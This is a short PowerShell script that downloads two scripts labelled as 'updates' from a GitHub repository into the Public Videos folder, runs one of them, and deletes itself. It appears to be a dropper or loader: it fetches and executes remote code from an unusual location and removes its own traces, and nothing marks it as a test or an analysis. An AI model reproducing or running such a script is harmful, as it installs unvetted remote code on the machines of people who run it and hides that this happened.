Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/moveupdate.ps1 -OutFile C:\Users\Public\Videos\moveupdate.ps1 -UseBasicParsing
Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/executeupdate.ps1 -OutFile C:\Users\Public\Videos\executeupdate.ps1 -UseBasicParsing
Start-Process -FilePath "C:\Users\Public\Videos\moveupdate.ps1"
Remove-Item -Path $scriptPath -Force
pause